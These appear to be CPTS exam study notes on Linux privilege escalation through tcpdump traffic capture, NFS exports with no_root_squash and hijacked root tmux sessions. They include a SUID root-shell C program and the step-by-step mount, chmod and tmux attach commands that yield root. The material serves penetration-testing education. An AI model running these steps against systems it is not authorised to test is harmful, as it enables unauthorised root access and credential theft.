## 1. Passive Traffic Capture

If `tcpdump` is installed, an unprivileged user may sometimes be able to capture network traffic.

This can expose sensitive information if traffic is not encrypted.

### Possible captured information

```text
Network Traffic
      ↓
   tcpdump
      ↓
Captured packets
      ↓
Credentials / hashes / sensitive data
```

Potentially exposed:

- Cleartext credentials
    
- Credit card numbers
    
- SNMP community strings
    
- Net-NTLMv2 hashes
    
- SMBv2 hashes
    
- Kerberos hashes
    
- HTTP credentials
    
- FTP credentials
    
- POP credentials
    
- IMAP credentials
    
- Telnet credentials
    
- SMTP credentials
    

Tools mentioned by the module:

- `net-creds`
    
- `PCredz`
    

### Important idea

Cleartext protocols are particularly valuable:

```text
HTTP
FTP
POP
IMAP
Telnet
SMTP
```

If credentials are captured, they may be reused to escalate privileges or move laterally.

### CPTS mindset

```text
Can I capture traffic?
        ↓
What interfaces can I sniff?
        ↓
What protocols are being used?
        ↓
Is authentication cleartext?
        ↓
Are hashes exposed?
        ↓
Can captured credentials be reused?
```

---

# 2. Weak NFS Privileges

## What is NFS?

**NFS — Network File System**

NFS allows Unix/Linux systems to share files and directories over a network.

Default NFS port:

```text
TCP/UDP 2049
```

---

## 3. Enumerating NFS Exports

Use:

```bash
showmount -e <TARGET_IP>
```

Example:

```bash
showmount -e 10.129.2.12
```

Output:

```text
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

This tells us which filesystems/directories are exported and who can access them.

### Attack mindset

```text
NFS server
    ↓
showmount -e
    ↓
Find exported directories
    ↓
Check export options
    ↓
Look for no_root_squash
```

---

# 4. `root_squash` vs `no_root_squash`

This is the **most important concept** in this section.

### `root_squash`

When root accesses the NFS share remotely:

```text
Remote root
    ↓
NFS server
    ↓
nfsnobody
```

The remote root user is mapped to an unprivileged account.

This prevents an attacker from creating root-owned files, including malicious SUID binaries.

---

### `no_root_squash`

With:

```text
no_root_squash
```

remote root remains root on the NFS server.

```text
Remote root
    ↓
NFS server
    ↓
ROOT
```

Therefore an attacker who can access the share as root may be able to create:

- Root-owned files
    
- SUID binaries
    
- Malicious scripts/programs
    

---

# 5. `/etc/exports`

NFS exports are configured in:

```text
/etc/exports
```

Check it when you have access:

```bash
cat /etc/exports
```

Example from the module:

```text
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Breakdown:

```text
/var/nfs/general
        ↓
Exported directory

*
        ↓
Clients allowed according to this export rule

rw
        ↓
Read + Write

no_root_squash
        ↓
Remote root remains root
```

### 🚨 High-value finding

```text
rw + no_root_squash
```

is a major NFS privilege-escalation indicator.

---

# 6. NFS PrivEsc Attack Chain

```text
NFS Export
    │
    ↓
Writable?
    │
    ↓
no_root_squash?
    │
    ↓
Can access as root?
    │
    ↓
Create root-owned malicious file
    │
    ↓
Set SUID
    │
    ↓
Execute from low-privileged account
    │
    ↓
ROOT
```

---

# 7. SUID Binary Technique

The module creates a small C program that launches Bash with UID/GID 0.

Example:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

Compile:

```bash
gcc shell.c -o shell
```

The important part isn't the C programming itself.

The important concept is:

```text
Create binary
     ↓
Place it on NFS share
     ↓
NFS preserves root ownership because of no_root_squash
     ↓
Set SUID
     ↓
Execute as low-privileged user
     ↓
Binary runs with owner privileges
     ↓
ROOT
```

---

# 8. Mount the NFS Share

Example:

```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

Then:

```bash
cp shell /mnt
```

Set SUID:

```bash
chmod u+s /mnt/shell
```

Check:

```bash
ls -la /mnt
```

The module shows:

```text
-rwsr-xr-x 1 root root 16712 Sep 1 06:15 shell
```

Notice:

```text
-rwsr-xr-x
   ↑
   SUID
```

The `s` in the owner's execute position indicates SUID.

---

# 9. Execute the SUID Binary

From the low-privileged target session:

```bash
./shell
```

Then:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root),...
```

Therefore:

```text
ROOT SHELL
```

---

# 10. Critical Connection: NFS + SUID

You already learned **SUID abuse**.

NFS gives us a way to **create/control a root-owned SUID binary remotely** when `no_root_squash` is misconfigured.

```text
SUID module:
    Find existing SUID
          ↓
    Abuse it

NFS module:
    no_root_squash
          ↓
    Create root-owned file
          ↓
    Make it SUID
          ↓
    Abuse SUID
```

This is a very important CPTS connection.

---

# 11. Hijacking Tmux Sessions

## What is tmux?

`tmux` is a terminal multiplexer.

It allows multiple terminal sessions to exist inside a single console.

A user can:

```text
Start session
     ↓
Detach
     ↓
Session continues running
     ↓
Reattach later
```

For example, a privileged user may leave a root `tmux` session running.

If its Unix socket has weak permissions, another user may be able to attach to it.

---

# 12. Tmux Attack Concept

```text
Root tmux session
       │
       ↓
Tmux socket
       │
       ↓
Weak permissions
       │
       ↓
Attacker can access socket
       │
       ↓
Attach to root session
       │
       ↓
ROOT SHELL
```

---

# 13. Creating the Vulnerable Example

The module creates a shared tmux socket:

```bash
tmux -S /shareds new -s debugsess
```

Then changes ownership:

```bash
chown root:devs /shareds
```

Now the socket is:

```text
root:devs
```

Therefore members of the `devs` group may be able to access it.

---

# 14. Find Running Tmux Processes

Use:

```bash
ps aux | grep tmux
```

Example:

```text
root 4806 ... tmux -S /shareds new -s debugsess
```

Important information:

```text
root
 ↓
tmux
 ↓
-S /shareds
 ↓
Interesting socket
```

---

# 15. Check Tmux Socket Permissions

```bash
ls -la /shareds
```

Example:

```text
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
```

Breakdown:

```text
root
 ↓
Owner

devs
 ↓
Group

rw
 ↓
Group has read/write access
```

The `s` at the beginning:

```text
srw-rw----
↑
Unix socket
```

---

# 16. Check Group Membership

```bash
id
```

Example:

```text
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

We are members of:

```text
devs
```

and the tmux socket belongs to:

```text
root:devs
```

Therefore we can potentially access the root tmux session.

---

# 17. Attach to the Session

The module uses:

```bash
tmux -S /shareds
```

Once attached:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We have effectively hijacked the existing root session.

---

# 18. Tmux Enumeration Workflow

```text
ps aux | grep tmux
        ↓
Find privileged tmux process
        ↓
Identify -S socket
        ↓
ls -la <socket>
        ↓
Check owner/group/permissions
        ↓
id
        ↓
Do we belong to the socket's group?
        ↓
Attach
        ↓
ROOT
```

---

# 🔥 CPTS Must-Know

## Passive Traffic Capture

```text
tcpdump
   ↓
Capture packets
   ↓
Look for:
credentials
hashes
SNMP strings
cleartext protocols
```

Cleartext protocols:

```text
HTTP
FTP
POP
IMAP
Telnet
SMTP
```

---

## NFS

Enumeration:

```bash
showmount -e <IP>
```

Configuration:

```bash
cat /etc/exports
```

Important:

```text
root_squash
    ↓
Remote root → nfsnobody

no_root_squash
    ↓
Remote root → root
```

### 🚨 Remember

```text
rw + no_root_squash
        ↓
HIGH-VALUE NFS FINDING
```

---

## Tmux

Find sessions:

```bash
ps aux | grep tmux
```

Check socket:

```bash
ls -la /shareds
```

Check groups:

```bash
id
```

Potential abuse:

```bash
tmux -S /shareds
```

### Key condition

```text
Privileged tmux
      +
Accessible socket
      +
Group/user permission
      ↓
Session hijacking
      ↓
Privilege escalation
```

---

# 🧠 Final Memory Map

```text
             MISC TECHNIQUES
                    │
       ┌────────────┼────────────┐
       ↓            ↓            ↓
   Traffic         NFS          Tmux
   Capture        Abuse        Hijack
       │            │            │
       ↓            ↓            ↓
 Credentials   no_root_squash  Weak socket
 / Hashes          │            │
       │            ↓            ↓
       ↓       Root-owned     Attach to
  Reuse creds   SUID binary   root session
                    │            │
                    └─────┬──────┘
                          ↓
                       ROOT
```

### 🔑 One-line exam memory

**Traffic → capture secrets | NFS → check `no_root_squash` | Tmux → check privileged sessions + socket permissions.**